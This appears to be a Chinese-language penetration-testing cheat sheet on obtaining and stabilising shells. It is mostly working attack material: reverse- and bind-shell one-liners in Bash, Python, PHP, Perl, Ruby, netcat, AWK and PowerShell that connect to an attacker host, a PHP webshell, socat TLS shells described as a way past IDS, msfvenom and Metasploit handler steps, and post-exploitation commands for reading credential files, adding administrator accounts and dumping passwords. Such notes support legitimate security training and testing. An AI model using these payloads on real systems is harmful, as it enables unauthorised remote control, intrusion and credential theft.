### 1. Shell概述
#### 概述
Shell是在目标系统上执行命令的一种方式。主要分为反弹Shell（Reverse Shell）和正向Shell（Bind Shell）。获取Shell是渗透测试中控制目标系统的关键步骤。

### 2. 反弹Shell (Reverse Shell)
#### 概述
反弹Shell由目标机器主动发起连接到攻击者机器。这种方式通常用于目标机器防火墙限制入站连接，但允许出站连接的情况。
#### 方法
1.  **设置监听器 (Attacker Machine)**
    *   使用Netcat (`nc`) 监听指定端口，等待目标连接。
    *   常用端口：`53`, `80`, `443`, `8080` 等，以混淆流量。
    *   命令示例：`nc -lvnp 443`
        *   `-l`: 监听模式
        *   `-v`: 详细输出
        *   `-n`: 不进行DNS解析
        *   `-p`: 指定端口

2.  **执行Payload (Target Machine)**
    *   在目标机器上执行特定命令，使其连接回攻击者的监听器。
    *   **Linux `nc` Payload示例:**
        ```bash
        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <LISTENER_PORT> > /tmp/f
        ```
    *   **Payload分解:**
        *   `rm -f /tmp/f`: 删除可能已存在的管道文件，避免冲突。
        *   `mkfifo /tmp/f`: 创建一个命名管道 (FIFO)，用于进程间通信。
        *   `cat /tmp/f`: 从管道读取数据（等待输入）。
        *   `| /bin/sh -i 2>&1`: 将管道读取的内容传递给一个交互式Shell (`sh -i`)。`2>&1` 将标准错误重定向到标准输出，确保错误信息也发送给攻击者。
        *   `| nc <ATTACKER_IP> <LISTENER_PORT>`: 将Shell的输出通过Netcat发送到攻击者的IP和端口。
        *   `> /tmp/f`: 将从Netcat接收到的（攻击者的命令）写回管道，完成双向通信。

### 3. 正向Shell (Bind Shell)
#### 概述
正向Shell在目标机器上监听一个端口，等待攻击者主动连接。攻击者连接成功后，即可获得Shell。这种方式要求目标机器的防火墙允许入站连接到该监听端口。
#### 方法
1.  **执行Payload (Target Machine)**
    *   在目标机器上执行特定命令，使其在指定端口开启监听并绑定Shell。
    *   **Linux `nc` Payload示例:**
        ```bash
        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p <BIND_PORT> > /tmp/f
        # 或者更通用的监听所有接口：
        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 <BIND_PORT> > /tmp/f
        ```
        *   **注意:** 监听1024以下的端口通常需要root权限。使用如`8080`等高位端口可避免此问题。 Payload结构与反弹Shell类似，主要区别在于使用`nc -l -p <PORT>` (或 `nc -l <PORT>`) 在目标机上监听。

2.  **连接Shell (Attacker Machine)**
    *   使用Netcat (`nc`) 连接到目标机器监听的IP和端口。
    *   命令示例：`nc -nv <TARGET_IP> <BIND_PORT>`
        *   `-n`: 禁用DNS解析。
        *   `-v`: 详细模式。
        *   `<TARGET_IP>`: 目标机器IP。
        *   `<BIND_PORT>`: 目标机器监听的端口。

### 4. 常用监听器 (Listeners)
#### 概述
监听器是在攻击者机器上运行的、用于接收反弹Shell连接或连接正向Shell的工具。
#### 工具
1.  **Netcat (`nc`)**
    *   基础的网络工具，常用于建立TCP/UDP连接、端口扫描、文件传输和Shell监听。
    *   监听命令: `nc -lvnp <PORT>`
2.  **Rlwrap**
    *   一个包装器工具，为其他命令（如`nc`）提供历史记录、Tab补全和箭头键编辑功能，增强交互性。
    *   用法示例: `rlwrap nc -lvnp <PORT>`
3.  **Ncat**
    *   Nmap项目开发的`nc`增强版，提供SSL加密等额外功能。
    *   基本监听: `ncat -lvnp <PORT>`
    *   SSL加密监听: `ncat --ssl -lvnp <PORT>` (会自动生成临时证书)
4.  **Socat**
    *   强大的网络工具，可以在两个数据流之间建立连接，支持多种协议和选项。
    *   基本TCP监听: `socat TCP-LISTEN:<PORT> STDOUT`
    *   详细模式: `socat -d -d TCP-LISTEN:<PORT> STDOUT` (`-d`增加详细级别)

### 5. Shell Payload示例
#### 概述
Shell Payload是在目标系统上执行的命令或脚本，用于创建反弹或正向Shell。以下是一些常见语言/工具的Payload示例（主要为反弹Shell）。
#### Payloads
1.  **Bash**
    *   **TCP文件描述符:**
        ```bash
        exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>; cat <&5 | while read line; do $line 2>&5 >&5; done
        # 或者更简洁的:
        /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
        ```
    *   **配合`sh -i` (如前述`nc` Payload中):**
        ```bash
        sh -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f
        ```
2.  **Python**
    *   **标准库 (socket, subprocess, os):**
        ```python
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
        ```
    *   **标准库 + PTY (提供更好的交互性):**
        ```python
        python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST","<ATTACKER_IP>"),int(os.getenv("RPORT","<PORT>"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
        # 更短的版本:
        python -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
        ```
3.  **PHP**
    *   通常用于Webshell场景，执行系统命令。
    *   **反弹Shell示例:** (需要目标系统允许`proc_open`等函数)
        ```php
        php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
        # (更复杂的Payload可能需要处理文件描述符)
        ```
4.  **Perl**
    ```perl
    perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    ```
5.  **Ruby**
    ```ruby
    ruby -rsocket -e'f=TCPSocket.open("<ATTACKER_IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    ```
6.  **Netcat (`nc`)**
    *   如果目标上有`nc`且支持`-e`选项 (较旧或特定版本):
        ```bash
        nc <ATTACKER_IP> <PORT> -e /bin/bash
        # Windows:
        nc <ATTACKER_IP> <PORT> -e cmd.exe
        ```
    *   **BusyBox `nc`:** (通常不支持`-e`, 使用管道)
        ```bash
        busybox nc <ATTACKER_IP> <PORT> | /bin/sh | busybox nc <ATTACKER_IP> <SOME_OTHER_PORT> # (需要两个监听端口)
        # 或者使用前面提到的mkfifo方法
        ```
7.  **Telnet**
    *   (较少见，需要`telnet`和命名管道)
        ```bash
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER_IP> <PORT> >/tmp/f
        ```
8.  **AWK**
    *   (单行反弹Shell)
        ```awk
        awk 'BEGIN {s = "/inet/tcp/0/<ATTACKER_IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
        ```
9.  **PowerShell (Windows)**
    *   **基本反弹:**
        ```powershell
        powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        ```
    *   **Nishang框架中的Invoke-PowerShellTcp.ps1脚本是更常用和功能完善的选择。**

### 6. Webshell
#### 概述
Webshell是用Web服务器支持的语言（如PHP, ASP, JSP）编写的脚本，上传到目标Web服务器后，允许攻击者通过浏览器或其他HTTP客户端远程执行系统命令或管理文件。
#### 特点
-   隐蔽性：可以伪装成正常文件嵌入Web应用中。
-   便捷性：通过HTTP/S协议访问，易于穿透防火墙。
#### 示例 (简单PHP Webshell)
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
// 用法: http://target.com/webshell.php?cmd=whoami
```
#### 资源
-   Kali Linux中预置了多种Webshell：`/usr/share/webshells/`

### 7. Shell稳定性与增强
#### 概述
原始的Netcat Shell通常功能有限（例如，`Ctrl+C`会断开连接，不支持Tab补全、历史记录，无法运行`vim`等全屏应用）。需要进行稳定化处理以获得更好的交互体验。
#### 方法
1.  **Python PTY升级 (常用)**
    *   **步骤1:** 在获得的原始Shell中，检查并使用Python生成一个更好的Shell：
        ```bash
        python -c 'import pty; pty.spawn("/bin/bash")'
        # 或 python3 -c 'import pty; pty.spawn("/bin/bash")'
        ```
    *   **步骤2:** 设置终端类型 (如果需要，以支持clear等命令):
        ```bash
        export TERM=xterm
        ```
    *   **步骤3:** 背景化当前Shell并配置本地终端：
        *   按 `Ctrl+Z` 将当前Shell放入后台。
        *   在 *攻击者* 的终端执行：`stty raw -echo; fg`
        *   按回车，Shell恢复到前台，现在`Ctrl+C`会传递给目标进程而不是断开连接，Tab补全和箭头键也可能工作得更好。
    *   **步骤4 (可选):** 修复终端大小：
        *   在攻击者另一个终端执行 `stty -a`，记下 `rows` 和 `columns` 的值。
        *   在稳定化的Shell中执行：
            ```bash
            stty rows <number>
            stty cols <number>
            ```
    *   **恢复:** 如果终端显示混乱，可尝试 `reset` 命令。

2.  **使用 `rlwrap`**
    *   在启动监听器时使用 `rlwrap`: `rlwrap nc -lvnp <PORT>`
    *   这可以立即提供历史记录和基本编辑功能。
    *   要获得完整的稳定性（如`Ctrl+C`），仍需执行上述Python PTY升级和`stty raw -echo; fg`步骤。

3.  **使用 `socat` (强大稳定)**
    *   `socat` 可以创建更稳定的TTY Shell，尤其是在Linux目标上。
    *   **攻击者监听 (创建稳定TTY):**
        ```bash
        socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
        # file:`tty`: 将当前终端作为文件。
        # raw: 禁用规范行处理。
        # echo=0: 关闭本地回显。
        # tcp-listen: 创建TCP监听器。
        ```
    *   **目标执行 (连接并提供PTY):**
        ```bash
        socat tcp-connect:<ATTACKER_IP>:<PORT> exec:'bash -li',pty,stderr,sigint,setsid,sane
        # exec:'bash -li': 执行交互式登录Shell。
        # pty: 分配一个伪终端。
        # stderr: 重定向错误输出。
        # sigint: 传递Ctrl+C信号。
        # setsid: 在新会话中运行进程。
        # sane: 设置合理的终端模式。
        ```
    *   **Windows上的Socat:** Windows版本的Socat可能不如`nc`或PowerShell反弹稳定，但可以用于基本连接和Bind Shell。
        *   Windows反弹: `socat TCP:<ATTACKER_IP>:<PORT> EXEC:powershell.exe,pipes`
        *   Windows绑定: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

### 8. 加密Shell (Socat)
#### 概述
使用加密可以绕过某些基于流量特征检测的IDS/IPS。`socat` 支持SSL/TLS加密。
#### 方法
1.  **生成证书 (Attacker Machine)**
    *   创建自签名证书和密钥：
        ```bash
        openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
        # 合并为.pem文件：
        cat shell.key shell.crt > shell.pem
        ```
2.  **加密监听器 (Attacker Machine)**
    *   使用 `OPENSSL-LISTEN`，指定证书，并禁用验证（因为是自签名）。
    *   **反弹Shell监听:**
        ```bash
        socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
        # 结合TTY稳定化:
        socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
        ```
    *   **绑定Shell监听 (在目标执行):**
        ```bash
        # Linux:
        socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:'bash -li',pty,stderr,sigint,setsid,sane
        # Windows:
        socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:powershell.exe,pipes
        ```
3.  **加密客户端 (Target Machine)**
    *   使用 `OPENSSL`, 连接到监听器，禁用验证。
    *   **连接反弹监听:**
        ```bash
        # Linux (配合稳定监听):
        socat OPENSSL:<ATTACKER_IP>:<PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
        # Windows (配合稳定监听):
        socat OPENSSL:<ATTACKER_IP>:<PORT>,verify=0 EXEC:powershell.exe,pipes
        ```
    *   **连接绑定监听:**
        ```bash
        socat OPENSSL:<TARGET_IP>:<TARGET_PORT>,verify=0 -
        # 结合TTY稳定化 (连接到稳定绑定Shell):
        socat OPENSSL:<TARGET_IP>:<TARGET_PORT>,verify=0 FILE:`tty`,raw,echo=0
        ```

### 9. 使用 `msfvenom` 生成Payload
#### 概述
`msfvenom` 是Metasploit框架中的一个工具，用于生成各种格式的Shellcode和Payload（包括反弹和绑定Shell），支持多种平台和架构。
#### 方法
1.  **基本语法:**
    `msfvenom -p <PAYLOAD> [OPTIONS] LHOST=<ATTACKER_IP> LPORT=<LISTENER_PORT> -f <FORMAT> -o <OUTPUT_FILE>`
    *   `-p`: 指定Payload (e.g., `windows/x64/shell_reverse_tcp`, `linux/x86/meterpreter/reverse_tcp`)
    *   `LHOST`: 监听者（攻击者）IP地址。
    *   `LPORT`: 监听者端口。
    *   `-f`: 输出格式 (e.g., `exe`, `elf`, `php`, `py`, `raw`)。
    *   `-o`: 输出文件名。
    *   `--list payloads`: 查看所有可用Payload。

2.  **Payload命名约定:**
    *   `<OS>/<arch>/<payload>` 或 `<OS>/<payload>`
    *   Staged (分阶段): 如 `windows/meterpreter/reverse_tcp` (先发送小程序，再加载大功能)。
    *   Stageless (无阶段): 如 `windows/meterpreter_reverse_tcp` (一次性发送完整功能)。 通常文件名中用下划线分隔表示无阶段。

3.  **示例 (Windows x64反弹TCP Shell EXE):**
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LISTENER_PORT> -f exe -o reverse_shell.exe
    ```

### 10. 使用Metasploit `multi/handler` 接收Shell
#### 概述
Metasploit的 `exploit/multi/handler` 是一个通用的监听器，专门用于接收由`msfvenom`生成的（尤其是Meterpreter）Shell连接。
#### 方法
1.  启动Metasploit控制台: `msfconsole`
2.  选择 `multi/handler`: `use exploit/multi/handler`
3.  设置Payload (必须与`msfvenom`生成时使用的Payload匹配):
    `set PAYLOAD <payload_name>` (e.g., `set PAYLOAD windows/x64/shell_reverse_tcp`)
4.  设置监听IP (`LHOST`): `set LHOST <ATTACKER_IP>` (通常是攻击者本地IP)
5.  设置监听端口 (`LPORT`): `set LPORT <LISTENER_PORT>`
6.  启动监听器:
    *   `run` 或 `exploit` (在前台运行)
    *   `exploit -j` (在后台作为作业运行，允许继续使用`msfconsole`)
7.  当目标机器执行相应的`msfvenom`生成的Payload时，`multi/handler`会接收连接，并建立会话。

### 11. 获取Shell后的初步操作 (Post-Exploitation)
#### 概述
成功获取Shell后，通常需要进行信息收集、权限提升、持久化等后续操作。
#### 常见初步目标
1.  **Linux:**
    *   查找SSH密钥：`~/.ssh/id_rsa`, `~/.ssh/known_hosts`
    *   查看用户信息和权限：`whoami`, `id`, `sudo -l`
    *   检查敏感文件：`/etc/passwd`, `/etc/shadow` (读取权限?), `/etc/sudoers`
    *   查找配置文件中的凭据。
    *   利用已知漏洞提权（如Dirty COW等）。
2.  **Windows:**
    *   查找存储的密码：
        *   浏览器密码
        *   注册表中的服务密码 (e.g., VNC: `HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password`)
        *   FileZilla Server配置文件 (`FileZilla Server.xml`)
    *   添加用户（如果权限足够）：
        ```cmd
        net user <username> <password> /add
        net localgroup administrators <username> /add
        ```
    *   启用RDP等远程访问。
    *   使用Mimikatz等工具抓取内存中的凭据。